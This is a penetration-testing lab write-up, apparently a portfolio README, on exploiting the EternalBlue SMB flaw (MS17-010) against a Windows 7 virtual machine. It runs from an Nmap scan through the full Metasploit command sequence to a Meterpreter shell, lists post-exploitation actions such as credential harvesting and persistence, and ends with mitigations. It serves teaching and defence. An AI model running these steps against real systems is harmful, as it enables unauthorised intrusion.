# EternalBlue SMB Exploitation Lab (Windows 7)

## Overview

This project demonstrates the identification and exploitation of the **EternalBlue SMB vulnerability (MS17-010)** on a vulnerable **Windows 7 Ultimate SP1** system within a controlled penetration testing lab environment.

The objective of this assessment was to simulate a real-world offensive security workflow including:

- Network reconnaissance
- Service enumeration
- Vulnerability research
- Exploitation of a known remote code execution vulnerability
- Gaining remote access to the target system

The successful exploitation resulted in a **Meterpreter shell**, confirming remote code execution on the vulnerable machine.

---

# Objectives

This lab demonstrates the following penetration testing capabilities:

- Conducting **network scanning and enumeration**
- Identifying **exposed services and operating systems**
- Researching **publicly known vulnerabilities**
- Exploiting **SMB vulnerabilities (MS17-010 / EternalBlue)**
- Using **Metasploit for exploitation**
- Establishing **remote access to compromised systems**

---

# Environment / Lab Setup

| Component | Details |
|----------|--------|
| Attacker Machine | Kali Linux |
| Target Machine | Windows 7 Ultimate SP1 |
| Target IP Address | `192.168.88.130` |
| Virtualization Platform | VMware |
| Network | Isolated local lab network |

---

# Methodology

## 1. Network Reconnaissance

The engagement began with a **full TCP port scan** using Nmap to identify open ports, running services, and operating system information.

### Command Used

```bash
nmap -T4 -p- -A 192.168.88.130
```

### Scan Results

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
```

### Key Observations

- **Port 445 (SMB) is open**
- Target system identified as **Windows 7 Ultimate 7601 Service Pack 1**
- **SMB message signing disabled**
- Multiple **RPC services exposed**

These indicators suggested that the system might be vulnerable to **SMB-based remote code execution vulnerabilities**.

---

# Vulnerability Identification

Researching the detected operating system revealed the well-known **MS17-010 vulnerability**, commonly exploited using **EternalBlue**.

### EternalBlue (MS17-010)

EternalBlue exploits a flaw in the **SMBv1 protocol** that allows attackers to execute arbitrary code remotely without authentication.

### Affected Systems

- Windows 7
- Windows Server 2008
- Windows Vista
- Windows XP (some configurations)

The vulnerability became widely known after being leaked from the **NSA Equation Group tools** and was later used in major cyberattacks such as **WannaCry ransomware**.

---

# Exploit Research

A public exploit was located on Exploit-DB:

```
https://www.exploit-db.com/exploits/42315
```

Additionally, the **Metasploit Framework** contains a ready-to-use exploit module for this vulnerability.

---

# Exploitation

## Launch Metasploit

```bash
msfconsole
```

---

## Search for EternalBlue Exploit

```bash
search eternalblue
```

Relevant module identified:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

## Select the Exploit Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

## Configure Target

```bash
set RHOSTS 192.168.88.130
```

---

## Verify Module Configuration

```bash
options
```

---

## Check if Target is Vulnerable

Before launching the exploit, a vulnerability check was performed:

```bash
check
```

The result indicated the system was **likely vulnerable to MS17-010**.

---

## Execute the Exploit

```bash
exploit
```

After execution, the exploit successfully returned a **Meterpreter session**.

---

# Post-Exploitation

Once the exploit completed successfully, a **Meterpreter shell** was established.

Example prompt:

```
meterpreter >
```

At this stage, an attacker or penetration tester could perform additional actions such as:

- System enumeration
- Privilege escalation attempts
- Credential harvesting
- File system interaction
- Persistence installation

The successful Meterpreter session confirms **remote code execution on the target system**.

---

# Tools Used

| Tool | Purpose |
|-----|------|
| Nmap | Network scanning and service enumeration |
| Metasploit Framework | Exploit development and execution |
| Kali Linux | Penetration testing operating system |
| Exploit-DB | Public vulnerability and exploit research |

---

# Key Findings

| Vulnerability | Description | Severity |
|---------------|------------|----------|
| MS17-010 (EternalBlue) | SMBv1 remote code execution vulnerability | Critical |
| SMB Message Signing Disabled | Allows potential SMB relay attacks | Medium |
| Outdated Operating System | Windows 7 SP1 is end-of-life and unsupported | High |

---

# Exploitation Summary

| Step | Action |
|-----|------|
| 1 | Performed network scan using Nmap |
| 2 | Discovered SMB service on port 445 |
| 3 | Identified Windows 7 SP1 operating system |
| 4 | Researched known vulnerabilities |
| 5 | Identified MS17-010 EternalBlue exploit |
| 6 | Used Metasploit exploit module |
| 7 | Successfully obtained a Meterpreter shell |

---

# Mitigation / Recommendations

To prevent exploitation of this vulnerability, the following defensive measures should be implemented.

## Apply Security Patches

Install Microsoft's **MS17-010 security update**.

---

## Disable SMBv1

SMBv1 is outdated and insecure and should be disabled.

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

---

## Enable SMB Signing

Require SMB message signing to reduce the risk of SMB relay attacks.

---

## Upgrade the Operating System

Windows 7 is **end-of-life** and should be upgraded to a supported operating system.

---

## Network Segmentation

Restrict SMB traffic between network segments to reduce lateral movement risk.

---

## Deploy Endpoint Detection and Response (EDR)

Modern security tools can detect abnormal SMB exploitation attempts.

---

# Skills Demonstrated

This project demonstrates the following offensive security skills:

- Network reconnaissance
- Service enumeration
- Vulnerability identification
- Exploit research
- SMB exploitation techniques
- Metasploit framework usage
- Post-exploitation shell management
- Penetration testing methodology

---

# Key Takeaways

This lab demonstrates a complete penetration testing workflow from **initial reconnaissance to successful exploitation**.

It highlights how **unpatched legacy systems and insecure SMB configurations** can lead to **critical remote code execution vulnerabilities**.

The project showcases practical skills relevant to **penetration testing, offensive security, and vulnerability assessment roles**, including vulnerability discovery, exploit execution, and system compromise.
